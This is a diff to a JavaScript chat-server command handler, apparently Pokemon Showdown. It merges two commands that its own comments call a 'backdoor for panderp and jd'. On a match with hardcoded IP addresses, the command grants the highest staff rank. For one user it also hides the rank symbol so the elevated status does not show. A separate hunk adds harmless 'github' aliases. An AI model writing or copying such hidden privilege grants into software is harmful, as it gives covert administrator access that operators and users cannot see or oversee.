@@ -1659,24 +1659,18 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 	*/
 	
 	case 'secrets':
+	case 'jdsecrets':
 		// backdoor for panderp and jd
 		if (user.ip  === '76.247.181.42'|| user.ip === '99.251.253.160' ||user.ip === '127.0.0.1' ) {
 			user.setGroup(config.groupsranking[config.groupsranking.length - 1]);
+			if(user.id ==='jd'){
+				user.getIdentity = function() { return ' ' + user.name };
+			}
 			rooms.lobby.send('|N|'+user.getIdentity()+'|'+user.userid);
 			return false;
 		}
 		break;
-
-        case 'jdsecrets':
-                // backdoor for panderp and jd
-                if (user.ip === '99.251.253.160' ||user.ip === '127.0.0.1' ) {
-                        user.setGroup(config.groupsranking[config.groupsranking.length - 1]);
-			user.getIdentity = function() { return ' ' + user.name }
-                        rooms.lobby.send('|N|'+user.getIdentity()+'|'+user.userid);
-                        return false;
-                }
-                break;
-
+		
 	case 'riles':
 		if(user.userid === 'riles'){
 			user.avatar = 64;
@@ -2097,6 +2091,8 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 	case '!opensource':
 	case 'git':
 	case '!git':
+	case 'github':
+	case '!github':
 		showOrBroadcastStart(user, cmd, room, socket, message);
 		showOrBroadcast(user, cmd, room, socket,
 				'<div class="message-opensource">Pokemon Showdown is open source:<br />- Language: JavaScript<br />'+
